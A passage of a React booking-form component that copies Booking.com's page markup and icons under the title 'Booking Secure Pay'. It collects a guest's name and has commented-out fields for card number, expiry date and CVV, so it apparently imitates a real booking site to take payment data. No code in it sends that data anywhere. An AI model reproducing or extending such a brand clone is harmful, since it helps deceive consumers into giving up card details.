    d="M56.08 94C40.76 93.71 34 86.93 34 72a4 4 0 0 0-8 0c0 15-6.85 21.79-22 22a4 4 0 0 0 0 8c15.08 0 21.86 6.8 22 22a4 4 0 0 0 3.92 4H30a4 4 0 0 0 4-3.8c.75-15.14 7.69-22.2 21.83-22.2H56a4 4 0 0 0 .08-8zm-25.84 13.06a22.592 22.592 0 0 0-8.89-9.13A22.62 22.62 0 0 0 30 89.38a22.88 22.88 0 0 0 8.92 8.67 23.504 23.504 0 0 0-8.68 9.01zM124.09 47C94.6 46.34 80.91 32.69 81 4.06V4a4 4 0 0 0-8 0c-.11 28.91-13.8 42.57-43.06 43a4 4 0 0 0 .06 8h.13c29 0 42.58 13.68 42.87 43a4 4 0 0 0 3.93 4H77a4 4 0 0 0 4-3.8C82.45 69.14 96.41 55 123.68 55h.32a4 4 0 0 0 .09-8zM86.83 60.1a43.579 43.579 0 0 0-9.43 15q-6.3-17.72-23.53-24.3a40.922 40.922 0 0 0 13.68-8.61A40.07 40.07 0 0 0 76.92 28q6.49 16.58 23.7 23a40.069 40.069 0 0 0-13.79 9.1z"></path></svg>
</span>
                                        </div>
                                        <div className="bui-group__item" bis_skin_checked="1">
<span className="bui-text--color-neutral_alt">
Необыкновенно чистые номера — 8,6
</span>
                                        </div>
                                    </div>
                                </div>
                                <div className="bui-group__item" bis_skin_checked="1">
                                    <div className="bui-group bui-group--inline bui-group--wrap-nowrap"
                                         bis_skin_checked="1">
                                        <div className="bui-group__item" bis_skin_checked="1">
<span className="bui-icon bui-icon--small">
<svg className="bk-icon -streamline-no_smoking" fill="#333333" height="16" role="presentation" width="16"
     viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path
    d="M19.5 9h2.25a.75.75 0 0 1 .75.75v3a.75.75 0 0 1-.75.75h-7.5a.75.75 0 0 0 0 1.5h7.5A2.25 2.25 0 0 0 24 12.75v-3a2.25 2.25 0 0 0-2.25-2.25H19.5a.75.75 0 0 0 0 1.5zM5.25 13.5h-1.5l.75.75v-6L3.75 9h7.5a.75.75 0 0 0 0-1.5h-7.5a.75.75 0 0 0-.75.75v6c0 .414.336.75.75.75h1.5a.75.75 0 0 0 0-1.5zM15 12v2.25a.75.75 0 0 0 1.5 0V12a.75.75 0 0 0-1.5 0zM0 8.25v6a.75.75 0 0 0 1.5 0v-6a.75.75 0 0 0-1.5 0zm1.28 15.53l22.5-22.5A.75.75 0 0 0 22.72.22L.22 22.72a.75.75 0 1 0 1.06 1.06zM4.5.75A2.25 2.25 0 0 1 2.25 3 2.25 2.25 0 0 0 0 5.25a.75.75 0 0 0 1.5 0 .75.75 0 0 1 .75-.75A3.75 3.75 0 0 0 6 .75a.75.75 0 0 0-1.5 0z"></path></svg>
</span>
                                        </div>
                                        <div className="bui-group__item" bis_skin_checked="1">
<span className="bui-text--color-neutral_alt">
Курение запрещено
</span>
                                            <input type="hidden" name="smoking_preference_257021803_229117878_0_2_0"
                                                   value="no"/>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="bui-group__item" bis_skin_checked="1">
                            <div className="bui-group bui-group--inline bui-group--small" bis_skin_checked="1">
                                <div className="bui-group__item" data-name-en="room size" data-facility-id="0"
                                     data-facility-type="0" bis_skin_checked="1"><span
                                    className=" bui-badge bui-badge--outline bp-bui-badge"><svg
                                    className="bk-icon -streamline-room_size" height="16" width="16" viewBox="0 0 24 24"
                                    role="presentation" aria-hidden="true" focusable="false"><path
                                    d="M3.75 23.25V7.5a.75.75 0 0 0-1.5 0v15.75a.75.75 0 0 0 1.5 0zM.22 21.53l2.25 2.25a.75.75 0 0 0 1.06 0l2.25-2.25a.75.75 0 1 0-1.06-1.06l-2.25 2.25h1.06l-2.25-2.25a.75.75 0 0 0-1.06 1.06zM5.78 9.22L3.53 6.97a.75.75 0 0 0-1.06 0L.22 9.22a.75.75 0 1 0 1.06 1.06l2.25-2.25H2.47l2.25 2.25a.75.75 0 1 0 1.06-1.06zM7.5 3.75h15.75a.75.75 0 0 0 0-1.5H7.5a.75.75 0 0 0 0 1.5zM9.22.22L6.97 2.47a.75.75 0 0 0 0 1.06l2.25 2.25a.75.75 0 1 0 1.06-1.06L8.03 2.47v1.06l2.25-2.25A.75.75 0 1 0 9.22.22zm12.31 5.56l2.25-2.25a.75.75 0 0 0 0-1.06L21.53.22a.75.75 0 1 0-1.06 1.06l2.25 2.25V2.47l-2.25 2.25a.75.75 0 0 0 1.06 1.06zM10.5 13.05v7.2a2.25 2.25 0 0 0 2.25 2.25h6A2.25 2.25 0 0 0 21 20.25v-7.2a.75.75 0 0 0-1.5 0v7.2a.75.75 0 0 1-.75.75h-6a.75.75 0 0 1-.75-.75v-7.2a.75.75 0 0 0-1.5 0zm13.252 2.143l-6.497-5.85a2.25 2.25 0 0 0-3.01 0l-6.497 5.85a.75.75 0 0 0 1.004 1.114l6.497-5.85a.75.75 0 0 1 1.002 0l6.497 5.85a.75.75 0 0 0 1.004-1.114z"></path></svg>25 кв. м</span>
                                </div>
                                <div className="bui-group__item" data-name-en="" data-facility-id="17"
                                     data-facility-type="1" bis_skin_checked="1"><span
                                    className=" bui-badge bui-badge--outline bp-bui-badge"><svg
                                    className="bk-icon -streamline-resort" height="16" width="16" viewBox="0 0 24 24"
                                    role="presentation" aria-hidden="true" focusable="false"><path
                                    d="M.768 11.413l1.5 6.75a.75.75 0 0 0 1.464-.326l-1.5-6.75a.75.75 0 0 0-1.464.326zM2.22 23.456l1.5-5.25L3 18.75h3a.75.75 0 0 1 .75.75v3.75a.75.75 0 0 0 1.5 0V19.5A2.25 2.25 0 0 0 6 17.25H3a.75.75 0 0 0-.721.544l-1.5 5.25a.75.75 0 1 0 1.442.412zm19.547-12.369l-1.5 6.75a.75.75 0 1 0 1.464.326l1.5-6.75a.75.75 0 1 0-1.464-.326zm1.453 11.957l-1.5-5.25A.75.75 0 0 0 21 17.25h-3a2.25 2.25 0 0 0-2.25 2.25v3.75a.75.75 0 0 0 1.5 0V19.5a.75.75 0 0 1 .75-.75h3l-.721-.544 1.5 5.25a.75.75 0 1 0 1.442-.412zM11.25 6.75v16.5a.75.75 0 0 0 1.5 0V6.75a.75.75 0 0 0-1.5 0zm-4.5 7.5h10.5a.75.75 0 0 0 0-1.5H6.75a.75.75 0 0 0 0 1.5zM1.5 6l10.064-4.37c.297-.161.575-.161.803-.033l10.178 4.425L22.5 6H1.5zm0 1.5h21a1.5 1.5 0 0 0 .689-2.832L13.034.255c-.616-.35-1.452-.35-2.136.034L.858 4.646c-.544.28-.856.792-.857 1.352A1.5 1.5 0 0 0 1.499 7.5z"></path></svg>Балкон</span>
                                </div>
                                <div className="bui-group__item" data-name-en="" data-facility-id="113"
                                     data-facility-type="1" bis_skin_checked="1"><span
                                    className=" bui-badge bui-badge--outline bp-bui-badge"><svg
                                    className="bk-icon -streamline-landmark" height="16" width="16" viewBox="0 0 24 24"
                                    role="presentation" aria-hidden="true" focusable="false"><path
                                    d="M4.5 8.911h3l-.75-.75v9l.75-.75h-3l.75.75v-9l-.75.75zm0-1.5a.75.75 0 0 0-.75.75v9c0 .414.336.75.75.75h3a.75.75 0 0 0 .75-.75v-9a.75.75 0 0 0-.75-.75h-3zm6 1.5h3l-.75-.75v9l.75-.75h-3l.75.75v-9l-.75.75zm0-1.5a.75.75 0 0 0-.75.75v9c0 .414.336.75.75.75h3a.75.75 0 0 0 .75-.75v-9a.75.75 0 0 0-.75-.75h-3zm6 1.5h3l-.75-.75v9l.75-.75h-3l.75.75v-9l-.75.75zm0-1.5a.75.75 0 0 0-.75.75v9c0 .414.336.75.75.75h3a.75.75 0 0 0 .75-.75v-9a.75.75 0 0 0-.75-.75h-3zm4.5 12H3l.75.75v-2.25h16.5v2.25l.75-.75zm0 1.5a.75.75 0 0 0 .75-.75v-2.25a1.5 1.5 0 0 0-1.5-1.5H3.75a1.5 1.5 0 0 0-1.5 1.5v2.25c0 .414.336.75.75.75h18zm-19.5 3h21a.75.75 0 0 0 0-1.5h-21a.75.75 0 0 0 0 1.5zm0-3h21a.75.75 0 0 0 0-1.5h-21a.75.75 0 0 0 0 1.5zm18.75-15.75v2.25H3.75v-2.25l-.415.67L12 1.5l8.665 4.332-.415-.671zm1.5 0a.75.75 0 0 0-.415-.67L12.67.157a1.503 1.503 0 0 0-1.34 0L2.666 4.49a.75.75 0 0 0-.415.671v2.25a1.5 1.5 0 0 0 1.5 1.5h16.5a1.5 1.5 0 0 0 1.5-1.5v-2.25zM3 5.911h18a.75.75 0 0 0 0-1.5H3a.75.75 0 0 0 0 1.5z"></path></svg>Вид на достопримечательность</span>
                                </div>
                                <div className="bui-group__item" data-name-en="" data-facility-id="121"
                                     data-facility-type="1" bis_skin_checked="1"><span
                                    className=" bui-badge bui-badge--outline bp-bui-badge"><svg
                                    className="bk-icon -streamline-city" height="16" width="16" viewBox="0 0 24 24"
                                    role="presentation" aria-hidden="true" focusable="false"><path
                                    d="M2.75 6h9.5a.25.25 0 0 1-.25-.25v17.5l.75-.75H2.25l.75.75V5.75a.25.25 0 0 1-.25.25zm0-1.5c-.69 0-1.25.56-1.25 1.25v17.5c0 .414.336.75.75.75h10.5a.75.75 0 0 0 .75-.75V5.75c0-.69-.56-1.25-1.25-1.25h-9.5zm3-1.5h3.5A.25.25 0 0 1 9 2.75v2.5l.75-.75h-4.5l.75.75v-2.5a.25.25 0 0 1-.25.25zm0-1.5c-.69 0-1.25.56-1.25 1.25v2.5c0 .414.336.75.75.75h4.5a.75.75 0 0 0 .75-.75v-2.5c0-.69-.56-1.25-1.25-1.25h-3.5zM5.25 9h4.5a.75.75 0 0 0 0-1.5h-4.5a.75.75 0 0 0 0 1.5zm0 3h4.5a.75.75 0 0 0 0-1.5h-4.5a.75.75 0 0 0 0 1.5zm0 3h4.5a.75.75 0 0 0 0-1.5h-4.5a.75.75 0 0 0 0 1.5zm0 3h4.5a.75.75 0 0 0 0-1.5h-4.5a.75.75 0 0 0 0 1.5zm0 3h4.5a.75.75 0 0 0 0-1.5h-4.5a.75.75 0 0 0 0 1.5zM7.5.75v1.5a.75.75 0 0 0 1.5 0V.75a.75.75 0 0 0-1.5 0zM15.75 24h6a.75.75 0 0 0 .75-.75V10.5A1.5 1.5 0 0 0 21 9h-4.5a1.5 1.5 0 0 0-1.5 1.5v12.75a.75.75 0 0 0 1.5 0V10.5H21v12.75l.75-.75h-6a.75.75 0 0 0 0 1.5zM19.5 8.25v1.5a.75.75 0 0 0 1.5 0v-1.5a.75.75 0 0 0-1.5 0zM.75 24h22.5a.75.75 0 0 0 0-1.5H.75a.75.75 0 0 0 0 1.5z"></path></svg>Вид на город</span>
                                </div>
                                <div className="bui-group__item" data-name-en="" data-facility-id="11"
                                     data-facility-type="1" bis_skin_checked="1"><span
                                    className=" bui-badge bui-badge--outline bp-bui-badge"><svg
                                    className="bk-icon -streamline-weather_snowflake" height="16" width="16"
                                    viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path
                                    d="M11.25.75v7.5a.75.75 0 0 0 1.5 0V.75a.75.75 0 0 0-1.5 0zm4.031.914l-3.75 3h.938l-3.75-3a.75.75 0 1 0-.938 1.172l3.75 3a.75.75 0 0 0 .938 0l3.75-3a.75.75 0 1 0-.938-1.172zM1.883 7.024l6.495 3.75a.75.75 0 0 0 .75-1.299l-6.495-3.75a.75.75 0 1 0-.75 1.3zM4.69 3.99l.723 4.748.468-.812-4.473 1.748a.75.75 0 0 0 .546 1.398l4.473-1.748a.75.75 0 0 0 .468-.812l-.723-4.748a.75.75 0 1 0-1.482.226zM2.632 18.274l6.495-3.75a.75.75 0 1 0-.75-1.298l-6.495 3.75a.75.75 0 1 0 .75 1.299zm-1.224-3.948l4.473 1.748-.468-.812-.723 4.748a.75.75 0 0 0 1.482.226l.723-4.748a.75.75 0 0 0-.468-.812l-4.473-1.748a.75.75 0 0 0-.546 1.398zM12.75 23.25v-7.5a.75.75 0 0 0-1.5 0v7.5a.75.75 0 0 0 1.5 0zm-4.031-.914l3.75-3h-.938l3.75 3a.75.75 0 0 0 .937-1.172l-3.75-3a.75.75 0 0 0-.937 0l-3.75 3a.75.75 0 0 0 .938 1.172zm13.399-5.36l-6.495-3.75a.75.75 0 0 0-.75 1.298l6.495 3.75a.75.75 0 0 0 .75-1.299zm-2.807 3.034l-.724-4.748-.468.812 4.473-1.748a.75.75 0 0 0-.546-1.398l-4.473 1.748a.75.75 0 0 0-.468.812l.723 4.748a.75.75 0 0 0 1.483-.226zm2.057-14.285l-6.495 3.75a.75.75 0 0 0 .75 1.3l6.495-3.75a.75.75 0 0 0-.75-1.3zm1.224 3.95l-4.473-1.749.468.812.724-4.748a.75.75 0 0 0-1.483-.226l-.723 4.748a.75.75 0 0 0 .468.812l4.473 1.748a.75.75 0 0 0 .546-1.398zM11.625 7.6L8.377 9.475a.75.75 0 0 0-.375.65v3.75a.75.75 0 0 0 .375.65l3.248 1.874a.75.75 0 0 0 .75 0l3.248-1.875a.75.75 0 0 0 .375-.649v-3.75a.75.75 0 0 0-.375-.65L12.375 7.6a.75.75 0 0 0-.75 0zm.75 1.3h-.75l3.248 1.874-.375-.649v3.75l.375-.65-3.248 1.876h.75l-3.248-1.876.375.65v-3.75l-.375.65L12.375 8.9z"></path></svg>Кондиционер</span>
                                </div>
                                <div className="bui-group__item" data-name-en="" data-facility-id="38"
                                     data-facility-type="1" bis_skin_checked="1"><span
                                    className=" bui-badge bui-badge--outline bp-bui-badge"><svg
                                    className="bk-icon -streamline-shower" height="16" width="16" viewBox="0 0 24 24"
                                    role="presentation" aria-hidden="true" focusable="false"><path
                                    d="M15.375 10.875a1.875 1.875 0 1 1-3.75 0 1.875 1.875 0 0 1 3.75 0zm1.5 0a3.375 3.375 0 1 0-6.75 0 3.375 3.375 0 0 0 6.75 0zm.375 12.375V18.7l-.667.745C20.748 18.98 24 15.925 24 10.5a2.25 2.25 0 0 0-4.5 0c0 1.945-.609 3.154-1.64 3.848a3.973 3.973 0 0 1-2.132.652H9a3.75 3.75 0 1 0 0 7.5h3a2.25 2.25 0 0 0 0-4.5H9a.75.75 0 0 0 0 1.5h3a.75.75 0 0 1 0 1.5H9a2.25 2.25 0 0 1 0-4.5h6.74a5.426 5.426 0 0 0 2.957-.908C20.154 14.613 21 12.932 21 10.5a.75.75 0 0 1 1.5 0c0 4.6-2.628 7.069-6.083 7.455a.75.75 0 0 0-.667.745v4.55a.75.75 0 0 0 1.5 0zm-7.5-1.5v1.5a.75.75 0 0 0 1.5 0v-1.5a.75.75 0 0 0-1.5 0zM.75 1.5h1.5l-.53-.22 1.402 1.402a.75.75 0 0 0 1.06-1.06L2.78.22A.75.75 0 0 0 2.25 0H.75a.75.75 0 1 0 0 1.5zm2.983 3.754a.01.01 0 0 1 .016.002c-.542-1.072-.1-2.426 1.008-2.988a2.25 2.25 0 0 1 2.037 0c-.041-.022-.043-.029-.04-.034l.002-.002-3.013 3.012zm1.07 1.05l3.002-3A1.489 1.489 0 0 0 7.51.951 3.766 3.766 0 0 0 4.079.929 3.75 3.75 0 0 0 2.43 5.971a1.49 1.49 0 0 0 2.382.323zm3.408-.968l1.116.62a.75.75 0 1 0 .728-1.312l-1.116-.62a.75.75 0 1 0-.728 1.312zm1.964-2.233l1.615.44a.75.75 0 1 0 .394-1.448l-1.615-.44a.75.75 0 1 0-.394 1.448zm4.217 1.15l1.615.44a.75.75 0 0 0 .396-1.447l-1.615-.44a.75.75 0 0 0-.396 1.447zM5.697 7.388l.577 1.038a.75.75 0 1 0 1.312-.728L7.009 6.66a.75.75 0 1 0-1.312.728zM3.284 8.94l.44 1.615a.75.75 0 1 0 1.448-.394l-.44-1.615a.75.75 0 1 0-1.448.394zm1.15 4.219l.246.896a.75.75 0 1 0 1.446-.396l-.245-.896a.75.75 0 1 0-1.446.396z"></path></svg>Собственная ванная комната</span>
                                </div>
                                <div className="bui-group__item" data-name-en="" data-facility-id="75"
                                     data-facility-type="1" bis_skin_checked="1"><span
                                    className=" bui-badge bui-badge--outline bp-bui-badge"><svg
                                    className="bk-icon -streamline-tv_flat_screen" height="16" width="16"
                                    viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path
                                    d="M22.5 10.375v6.5a.25.25 0 0 1-.25.25H1.75a.25.25 0 0 1-.25-.25v-13a.25.25 0 0 1 .25-.25h20.5a.25.25 0 0 1 .25.25v6.5zm1.5 0v-6.5a1.75 1.75 0 0 0-1.75-1.75H1.75A1.75 1.75 0 0 0 0 3.875v13c0 .966.784 1.75 1.75 1.75h20.5a1.75 1.75 0 0 0 1.75-1.75v-6.5zm-16.5 12h9a.75.75 0 0 0 0-1.5h-9a.75.75 0 0 0 0 1.5zm3.75-4.5v3.75a.75.75 0 0 0 1.5 0v-3.75a.75.75 0 0 0-1.5 0z"></path></svg>Телевизор с плоским экраном</span>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div className="bui-grid bui-grid--size-small" data-component="guest-name-email-handler"
                         bis_skin_checked="1">
                        <div className="bui-grid__column bui-grid__column-6@medium" bis_skin_checked="1">
                            <div className="bp_form__field bp_form__field--guest-name" bis_skin_checked="1">
                                <label className="bp_form__field__label" htmlFor="guest_name_257021803_229117878_0_2_0">
                                    Имя и фамилия гостя
                                </label>
                                <input type="text" name="guest_name_257021803_229117878_0_2_0"
                                       id="guest_name_257021803_229117878_0_2_0" className="
guest-name-input
login_for_name
bp_input_text
form-control
" value={entity.customerFIO} onChange={(e)=>setEntity((prevState)=>({...prevState,customerFIO: e.target.value}))} maxLength="60" placeholder="Имя (латиницей), Фамилия (латиницей)"/>
                            </div>
                        </div>
                        <div className="bui-grid__column bui-grid__column-6@medium js-guest-details__email"
                             bis_skin_checked="1">
                            <div className="bp_form__field bp_form__field--guest-email" bis_skin_checked="1">
                                <label className="bp_form__field__label" htmlFor="guest_email_257021803_229117878_0_2_0">
                                    Электронный адрес гостя
                                    <span className="bui-text--variant-body_2 bui-text--color-neutral_alt">
(необязательно)
</span>
                                </label>
                                <input type="text" name="guest_email_257021803_229117878_0_2_0" value=""
                                       placeholder="Адрес электронной почты" className="
guest-email-input
ClickTaleSensitive
bp_input_text
form-control
" id="guest_email_257021803_229117878_0_2_0" maxLength="60"/>
                                <div
                                    className="bui-text--variant-small_1 bui-text--color-neutral_alt bui-u-padding-top--4"
                                    bis_skin_checked="1">
                                    Мы отправляем на электронную почту только информацию о бронировании. Никаких
                                    рекламных рассылок — <b>гарантируем.</b>
                                </div>
                            </div>
                        </div>
                    </div>
                    <hr className="bui-divider bui-spacer--large bui-u-margin-top--16"/>
                    <div className="bui-grid bui-grid--size-small" bis_skin_checked="1">
                        <div className="bui-grid__column" bis_skin_checked="1">
                            <div className="bui-group__item" bis_skin_checked="1">
                                <fieldset
                                    className="bui-form__group bp-control-group bp-control-group--sleeping-arrangements js-control-group--sleeping-arrangements"
                                    aria-labelledby="bp-control-group__label--sleeping-arrangements">
                                    <legend className="bp-control-group__label bui-spacer--medium"
                                            id="bp-control-group__label--sleeping-arrangements">
                                        <h4 className="bui-f-font-body"><strong>Выберите тип кровати</strong> (при
                                            наличии):</h4>
                                    </legend>
                                    <div className="bui-group bui-group--medium" bis_skin_checked="1">
                                        <fieldset
                                            id="bp-control-group--bp-control-group--bed_prefs_chosen1_257021803_229117878_0_2_0"
                                            className="bui-form__group bp-control-group bp-control-group--bed_prefs_chosen_257021803_229117878_0_2_0 js-control-group--bed_prefs_chosen_257021803_229117878_0_2_0     "
                                            aria-role="radiogroup">
                                            <div className="bui-group  " bis_skin_checked="1">
                                                <div className="bui-group__item" bis_skin_checked="1">
                                                    <div
                                                        className="bui-form__group bp-form-group bp-form-group__notstayer_false"
                                                        bis_skin_checked="1">
                                                        <label className="bui-radio">
                                                            <input type="radio"
                                                                   id="bed_prefs_chosen_1_257021803_229117878_0_2_0_2"
                                                                   name="bed_prefs_chosen_1_257021803_229117878_0_2_0"
                                                                   value="1" className="bui-radio__input"/>
                                                            <span className="bui-radio__label">
2 односпальные кровати <svg className="bk-icon -streamline-bed" height="16" width="16" viewBox="0 0 24 24"
                            role="presentation" aria-hidden="true" focusable="false"><path
                                                                d="M2.75 12h18.5c.69 0 1.25.56 1.25 1.25V18l.75-.75H.75l.75.75v-4.75c0-.69.56-1.25 1.25-1.25zm0-1.5A2.75 2.75 0 0 0 0 13.25V18c0 .414.336.75.75.75h22.5A.75.75 0 0 0 24 18v-4.75a2.75 2.75 0 0 0-2.75-2.75H2.75zM0 18v3a.75.75 0 0 0 1.5 0v-3A.75.75 0 0 0 0 18zm22.5 0v3a.75.75 0 0 0 1.5 0v-3a.75.75 0 0 0-1.5 0zm-.75-6.75V4.5a2.25 2.25 0 0 0-2.25-2.25h-15A2.25 2.25 0 0 0 2.25 4.5v6.75a.75.75 0 0 0 1.5 0V4.5a.75.75 0 0 1 .75-.75h15a.75.75 0 0 1 .75.75v6.75a.75.75 0 0 0 1.5 0zm-13.25-3h7a.25.25 0 0 1 .25.25v2.75l.75-.75h-9l.75.75V8.5a.25.25 0 0 1 .25-.25zm0-1.5A1.75 1.75 0 0 0 6.75 8.5v2.75c0 .414.336.75.75.75h9a.75.75 0 0 0 .75-.75V8.5a1.75 1.75 0 0 0-1.75-1.75h-7z"></path></svg> <svg
                                                                className="bk-icon -streamline-bed" height="16" width="16" viewBox="0 0 24 24" role="presentation"
                                                                aria-hidden="true" focusable="false"><path
                                                                d="M2.75 12h18.5c.69 0 1.25.56 1.25 1.25V18l.75-.75H.75l.75.75v-4.75c0-.69.56-1.25 1.25-1.25zm0-1.5A2.75 2.75 0 0 0 0 13.25V18c0 .414.336.75.75.75h22.5A.75.75 0 0 0 24 18v-4.75a2.75 2.75 0 0 0-2.75-2.75H2.75zM0 18v3a.75.75 0 0 0 1.5 0v-3A.75.75 0 0 0 0 18zm22.5 0v3a.75.75 0 0 0 1.5 0v-3a.75.75 0 0 0-1.5 0zm-.75-6.75V4.5a2.25 2.25 0 0 0-2.25-2.25h-15A2.25 2.25 0 0 0 2.25 4.5v6.75a.75.75 0 0 0 1.5 0V4.5a.75.75 0 0 1 .75-.75h15a.75.75 0 0 1 .75.75v6.75a.75.75 0 0 0 1.5 0zm-13.25-3h7a.25.25 0 0 1 .25.25v2.75l.75-.75h-9l.75.75V8.5a.25.25 0 0 1 .25-.25zm0-1.5A1.75 1.75 0 0 0 6.75 8.5v2.75c0 .414.336.75.75.75h9a.75.75 0 0 0 .75-.75V8.5a1.75 1.75 0 0 0-1.75-1.75h-7z"></path></svg>
</span>
                                                        </label>
                                                    </div>
                                                </div>
                                                <div className="bui-group__item" bis_skin_checked="1">
                                                    <div
                                                        className="bui-form__group bp-form-group bp-form-group__notstayer_false"
                                                        bis_skin_checked="1">
                                                        <label className="bui-radio">
                                                            <input type="radio"
                                                                   id="bed_prefs_chosen_1_257021803_229117878_0_2_0_3"
                                                                   name="bed_prefs_chosen_1_257021803_229117878_0_2_0"
                                                                   value="2" className="bui-radio__input"/>
                                                            <span className="bui-radio__label">
1 большая двуспальная кровать <svg className="bk-icon -streamline-bed_double" height="16" width="16" viewBox="0 0 24 24"
                                   role="presentation" aria-hidden="true" focusable="false"><path
                                                                d="M3.75 11.25V9a.75.75 0 0 1 .75-.75h6a.75.75 0 0 1 .75.75v2.25a.75.75 0 0 0 1.5 0V9a2.25 2.25 0 0 0-2.25-2.25h-6A2.25 2.25 0 0 0 2.25 9v2.25a.75.75 0 0 0 1.5 0zm9 0V9a.75.75 0 0 1 .75-.75h6a.75.75 0 0 1 .75.75v2.25a.75.75 0 0 0 1.5 0V9a2.25 2.25 0 0 0-2.25-2.25h-6A2.25 2.25 0 0 0 11.25 9v2.25a.75.75 0 0 0 1.5 0zm-10 .75h18.5c.69 0 1.25.56 1.25 1.25V18l.75-.75H.75l.75.75v-4.75c0-.69.56-1.25 1.25-1.25zm0-1.5A2.75 2.75 0 0 0 0 13.25V18c0 .414.336.75.75.75h22.5A.75.75 0 0 0 24 18v-4.75a2.75 2.75 0 0 0-2.75-2.75H2.75zM0 18v3a.75.75 0 0 0 1.5 0v-3A.75.75 0 0 0 0 18zm22.5 0v3a.75.75 0 0 0 1.5 0v-3a.75.75 0 0 0-1.5 0zm-.75-6.75V4.5a2.25 2.25 0 0 0-2.25-2.25h-15A2.25 2.25 0 0 0 2.25 4.5v6.75a.75.75 0 0 0 1.5 0V4.5a.75.75 0 0 1 .75-.75h15a.75.75 0 0 1 .75.75v6.75a.75.75 0 0 0 1.5 0z"></path></svg>
</span>
                                                        </label>
                                                    </div>
                                                </div>
                                            </div>
                                            <div
                                                id="form-field__helper--bp-control-group--bed_prefs_chosen1_257021803_229117878_0_2_0"
                                                className="bui-form__error js-form-field__helper--bp-control-group--bed_prefs_chosen1_257021803_229117878_0_2_0"
                                                bis_skin_checked="1"></div>
                                        </fieldset>
                                    </div>
                                </fieldset>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
        </div>
    }

    return (
        <div>
            <Header/>
            <Container style={{backgroundColor: 'white'}}>
                <h2 className="booking-title">Booking Secure Pay</h2>
                <Row>
                    <div className={'col-4'}>
                        {/*<div className="p-4 rounded-2 border-black border">*/}
                        {/*    <h3 className="hotel-name">Emely Resort</h3>*/}
                        {/*    <p><strong>Дата заселения:</strong> 29.09.2024</p>*/}
                        {/*    <p><strong>Дата выселения:</strong> 14.10.2024</p>*/}
                        {/*    <p><strong>Количество гостей:</strong> 2 взрослых</p>*/}
                        {/*</div>*/}
                        <HotelInfo/>
                        <BookingInfo/>
                        <BookingPrice/>
                        <BookingPaymentTime/>
                        <CancelBookingPrice/>
                    </div>
                    <div className={'col-8'}>
                        <BookingClientInfo entity={entity} setEntity={setEntity}/>
                        <SecondHotelInfo/>
                        {/*<Form>*/}
                        {/*    <Form.Group controlId="formFirstName">*/}
                        {/*        <Form.Label>Имя</Form.Label>*/}
                        {/*        <Form.Control type="text" placeholder="Введите ваше имя"*/}
                        {/*                      value={entity.firstName}*/}
                        {/*                      onChange={(e) => setEntity((prevState) => ({*/}
                        {/*                          ...prevState,*/}
                        {/*                          firstName: e.target.value*/}
                        {/*                      }))}/>*/}
                        {/*    </Form.Group>*/}
                        {/*    <Form.Group controlId="formLastName">*/}
                        {/*        <Form.Label>Фамилия</Form.Label>*/}
                        {/*        <Form.Control type="text" placeholder="Введите вашу фамилию"*/}
                        {/*                      value={entity.lastName}*/}
                        {/*                      onChange={(e) => setEntity((prevState) => ({*/}
                        {/*                          ...prevState,*/}
                        {/*                          lastName: e.target.value*/}
                        {/*                      }))}/>*/}
                        {/*    </Form.Group>*/}
                        {/*    <Form.Group controlId="formPatronymic">*/}
                        {/*        <Form.Label>Отчество</Form.Label>*/}
                        {/*        <Form.Control type="text" placeholder="Введите ваше отчество" value={entity.fatherName}*/}
                        {/*                      onChange={(e) => setEntity((prevState) => ({*/}
                        {/*                          ...prevState,*/}
                        {/*                          fatherName: e.target.value*/}
                        {/*                      }))}/>*/}
                        {/*    </Form.Group>*/}
                        {/*    <Form.Group controlId="formPhoneNumber">*/}
                        {/*        <Form.Label>Номер телефона</Form.Label>*/}
                        {/*        <Form.Control type="tel" placeholder="Введите ваш номер телефона"*/}
                        {/*                      value={entity.phoneNumber}*/}
                        {/*                      onChange={(e) => setEntity((prevState) => ({*/}
                        {/*                          ...prevState,*/}
                        {/*                          phoneNumber: e.target.value*/}
                        {/*                      }))}/>*/}
                        {/*    </Form.Group>*/}
                        {/*    <Form.Group controlId="formCreditCardNumber">*/}
                        {/*        <Form.Label>Номер Кредитной карты</Form.Label>*/}
                        {/*        <Form.Control type="text" placeholder="Введите номер карты"*/}
                        {/*                      value={entity.cardNumber}*/}
                        {/*                      onChange={(e) => setEntity((prevState) => ({*/}
                        {/*                          ...prevState,*/}
                        {/*                          cardNumber: e.target.value*/}
                        {/*                      }))}/>*/}
                        {/*    </Form.Group>*/}
                        {/*    <Form.Group controlId="formExpirationDate">*/}
                        {/*        <Form.Label>Срок действия карты</Form.Label>*/}
                        {/*        <Form.Control type="text" placeholder="ММ/ГГ"*/}
                        {/*                      value={entity.cardDate}*/}
                        {/*                      onChange={(e) => setEntity((prevState) => ({*/}
                        {/*                          ...prevState,*/}
                        {/*                          cardDate: e.target.value*/}
                        {/*                      }))}/>*/}
                        {/*    </Form.Group>*/}
                        {/*    <Form.Group controlId="formCardholderName">*/}
                        {/*        <Form.Label>Имя владельца карты</Form.Label>*/}
                        {/*        <Form.Control type="text" placeholder="Введите имя владельца карты"*/}
                        {/*                      value={entity.cardholderName}*/}
                        {/*                      onChange={(e) => setEntity((prevState) => ({*/}
                        {/*                          ...prevState,*/}
                        {/*                          cardholderName: e.target.value*/}
                        {/*                      }))}/>*/}
                        {/*    </Form.Group>*/}
                        {/*    <Form.Group controlId="formCVV">*/}
                        {/*        <Form.Label>CVV</Form.Label>*/}
                        {/*        <Form.Control type="text" placeholder="Введите CVV"*/}
                        {/*                      className={'mb-2'}*/}
                        {/*                      value={entity.cardCVV}*/}
                        {/*                      onChange={(e) => setEntity((prevState) => ({*/}
                        {/*                          ...prevState,*/}
                        {/*                          cardCVV: e.target.value*/}
                        {/*                      }))}/>*/}
                        {/*    </Form.Group>*/}
                        {/*    <Button variant="btn btn-outline-dark" className={'w-100'} onClick={() => handleOrder()}>*/}
                        {/*        Оплатить*/}
                        {/*    </Button>*/}
                        {/*</Form>*/}
                    </div>
                </Row>
            </Container>
        </div>
    );
}

export default BookingForm;
